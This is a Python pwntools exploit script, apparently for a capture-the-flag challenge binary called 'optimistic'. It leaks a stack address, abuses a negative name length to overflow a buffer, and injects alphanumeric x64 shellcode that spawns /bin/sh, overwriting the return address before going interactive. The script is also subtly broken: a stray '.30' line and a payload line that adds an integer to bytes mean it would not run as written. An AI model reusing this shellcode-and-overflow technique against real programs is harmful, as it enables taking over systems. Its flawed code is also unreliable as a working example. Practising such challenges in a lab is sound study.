
from pwn import *

#context.log_level = 'DEBUG'
context(os='linux', arch='amd64')

padding_length = 104
ret_offset = -96

log.info('Create IO')
#io = remote('', )
io = process('/home/kali/Downloads/optimistic_patched')


log.info('Get Stack Address')
io.sendlineafter('(y/n): ', 'y')
stack_address = io.recvline().decode().strip().split()[-1][2:]
stack_address = bytes.fromhex(stack_address).rjust(8, b'\x00')
stack_address = u64(stack_address, endian='big')
stack_address += ret_offset
log.success(f'Leaked stack address: {p64(stack_address)}')

log.info('Send email and age')
io.sendlineafter(': ', 'email')
io.sendlineafter(': ', 'age')
.30
log.info('Send Name Lenght')
io.sendlineafter(': ', '-1')

#payload = cyclic(200)
#Alphanumeric Shellcode x64 /bin/sh
#https://www.exploit-db.com/exploits/35205
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'
#shellcode = asm(shellcraft.sh())
padding = b'A' * (padding_length - len(shellcode))
payload = shellcode + padding_length + p64(stack_address)


log.info('Send payload to name')
io.sendlineafter('Name: ', payload)



#log.info('Send Password')
#io.sendlineafter('> ', '2')
#io.sendlineafter('password: ', password)

#log.info('Send payload')
#shellcode = asm(
#    shellcraft.popad() +
#    shellcraft.sh()
#)
#padding = b'A' * (ret_offset - len(shellcode))
#payload = shellcode + padding + p64(stack_address)
#io.sendlineafter('commands: ', payload)

#log.info('Trigger Return')
#io.sendlineafter('> ', '3')

io.interactive()
